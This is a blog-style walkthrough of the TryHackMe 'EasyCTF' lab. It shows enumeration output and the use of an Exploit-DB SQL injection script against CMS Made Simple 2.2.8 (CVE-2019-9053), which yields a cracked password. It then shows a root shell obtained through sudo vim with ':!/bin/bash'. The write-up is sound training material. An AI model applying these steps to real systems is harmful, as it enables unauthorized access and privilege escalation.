---
title: "EasyCTF"
date: 2022-09-20T16:00:31+01:00
draft: false
categories:
  - TryHackMe
---

{{< post-img src="simple.png" alt="simple" style="width: 200px;" >}}

## Enumeraion

```bash
PORT     STATE SERVICE REASON  VERSION
21/tcp   open  ftp     syn-ack vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.8.226.203
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries
|_/ /openemr-5_0_1_3
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCj5RwZ5K4QU12jUD81IxGPdEmWFigjRwFNM2pVBCiIPWiMb+R82pdw5dQPFY0JjjicSysFN3pl8ea2L8acocd/7zWke6ce50tpHaDs8OdBYLfpkh+OzAsDwVWSslgKQ7rbi/ck1FF1LIgY7UQdo5FWiTMap7vFnsT/WHL3HcG5Q+el4glnO4xfMMvbRar5WZd4N0ZmcwORyXrEKvulWTOBLcoMGui95Xy7XKCkvpS9RCpJgsuNZ/oau9cdRs0gDoDLTW4S7OI9Nl5obm433k+7YwFeoLnuZnCzegEhgq/bpMo+fXTb/4ILI5bJHJQItH2Ae26iMhJjlFsMqQw0FzLf
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM6Q8K/lDR5QuGRzgfrQSDPYBEBcJ+/2YolisuiGuNIF+1FPOweJy9esTtstZkG3LPhwRDggCp4BP+Gmc92I3eY=
|   256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ2I73yryK/Q6UFyvBBMUJEfznlIdBXfnrEqQ3lWdymK
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

```bash
.htaccess               [Status: 403, Size: 294, Words: 22, Lines: 12]
[Status: 200, Size: 11321, Words: 3503, Lines: 376]
.hta                    [Status: 403, Size: 289, Words: 22, Lines: 12]
.htpasswd               [Status: 403, Size: 294, Words: 22, Lines: 12]
index.html              [Status: 200, Size: 11321, Words: 3503, Lines: 376]
robots.txt              [Status: 200, Size: 929, Words: 176, Lines: 33]
server-status           [Status: 403, Size: 298, Words: 22, Lines: 12]
simple                  [Status: 301, Size: 309, Words: 20, Lines: 10]
```

They say its easy

`robots.txt` is written by 'mike'
fuzzing show a simple page with 301 code...we visited and got a simple page made with cms made simple (CMSMS)
`This site is powered by CMS Made Simple version 2.2.8`

okay then...one of the pages say

```text
To get to the Administration Console you have to login as the administrator (with the username/password you mentioned during the installation process) on your site at http://yourwebsite.com/cmsmspath/admin. If this is your site click here to login.
```

lets google

Actually...found alot of cve that matches this version...but time-based sqli `CVE-2019-9053` was or best match
There is an exploit from exploitdb provided...a python script we are gonna use
Took me a bit to fix the script and make it work with python3 (I could just use python2 though)

I had to :

- change shebang line on top to 'python3' instead of 'python'
- add parenthesis to the print statements
- fix an error with md5 (added encode UTF-8 before the hexdigest) in crack_password function
- made sure to point -u argument to the simple cms path...like http://ip_address/simple
- and the most frustrating the TIME variable! due to my stupid slow internet I had to increase the variable to 20 to have results and it obviously took me waaaay longer

Anyway I got results

```bash
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
```

we ssh as mitch (remember the port is unusual -p 2222)

And we get right into business!
`$ cat user.txt`

## Priilege Escalation

```bash
$ sudo -l
User mitch may run the following commands on Machine:
(root) NOPASSWD: /usr/bin/vim
```

OH NO NOT VIM...hey but wait..we can run commands in vim

then its easy peazy

`sudo vim`

Then in vim we do:

```bash
:!/bin/bash
```

Ànd its over

```bash
root@Machine:~# id
uid=0(root) gid=0(root) groups=0(root)
```

Fastest privEsc in the west

```bash
root@Machine:/root# cat root.txt
```

its indeed an easy ctf...but its always fun to do

glhf!
